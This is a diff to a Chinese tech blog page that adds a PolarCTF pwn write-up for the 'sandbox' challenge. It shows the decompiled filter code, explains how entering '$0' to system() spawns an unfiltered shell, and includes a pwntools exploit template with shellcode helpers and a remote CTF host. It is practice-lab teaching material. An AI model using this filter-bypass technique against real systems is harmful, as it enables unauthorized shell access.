@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>haoo&#39;s tech blog - PolarCTF pwn靶场</title>
-<meta name="description" content="haoo的个人博客,用于记录相关学习笔记、技术文章、CTF writeup等">
+<meta name="description" content="简单sandbox[*] &amp;#x27;/mnt/d/ctf/polarctf/PWN/sandbox&amp;#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) St">
 <meta name="theme-color" content="#090c0b">
 <meta name="color-scheme" content="dark">
 <script>
@@ -75,7 +75,7 @@
     <article class="article-wrap">
       <header class="article-header">
         <div class="post-meta">
-          <span>0 字</span>
+          <span>3247 字</span>
         </div>
         <h1>PolarCTF pwn靶场</h1>
         
@@ -92,7 +92,18 @@
 
       <div class="article-grid">
         <div class="article-body article-prose" id="article-content">
-          
+          <h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><h2 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/ctf/polarctf/PWN/sandbox&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>放入ida中进一步分析一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__int64 box()<br>&#123;<br>  char buf[40]; // [rsp+0h] [rbp-30h] BYREF<br>  unsigned __int64 v2; // [rsp+28h] [rbp-8h]<br><br>  v2 = __readfsqword(0x28u);<br>  puts(&quot;Please input your command&quot;);<br>  puts(&quot;No sh,no cat,no flag.&quot;);<br>  system(&quot;ls&quot;);<br>  read(0, buf, 0x20u);<br>  if ( strchr(buf, &#x27;s&#x27;) || strchr(buf, &#x27;h&#x27;) || strstr(buf, &quot;cat&quot;) || strstr(buf, &quot;flag&quot;) || strchr(buf, &#x27;-&#x27;) )<br>  &#123;<br>    puts(&quot;Illegal command.&quot;);<br>    exit(0);<br>  &#125;<br>  system(buf);<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>题目编写的很简单，执行用户输入的指令，但是不能输入sh、cat、flag这些字符串作为指令执行。有一个system(“$0”)，也会再启动一个新的shell，这里的$0是交给外层shell展开的，外层shell执行时，命令是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/bin/sh -c &quot;$0&quot;<br></code></pre></td></tr></table></figure>
+
+<p>在这个外层shell中，$0通常表示shell自己的名字，一般system调用外层shell时，argv[0]是sh，所以正常情况下执行system(“$0”)和执行system(“sh”)没什么区别。而这道题目恰好没有禁用$0这一字符串，就可以输入$0从而获取shell，在新的shell里面就没有程序中那些限制了，就可以获得flag了。exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./sandbox&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=1<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2125<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu64    =   lambda data                 : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>sl(b&quot;$0&quot;)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h2 id="creeper"><a href="#creeper" class="headerlink" title="creeper"></a>creeper</h2><h2 id="简单溢出"><a href="#简单溢出" class="headerlink" title="简单溢出"></a>简单溢出</h2><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><h2 id="Emm"><a href="#Emm" class="headerlink" title="Emm"></a>Emm</h2><h2 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h2>
         </div>
 
         
@@ -125,7 +136,7 @@
 
   <footer class="site-footer">
   <div class="site-footer__inner">
-    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>32 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>35 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
     <p>&copy; haoo · powered by Hexo</p>
   </div>
 </footer>
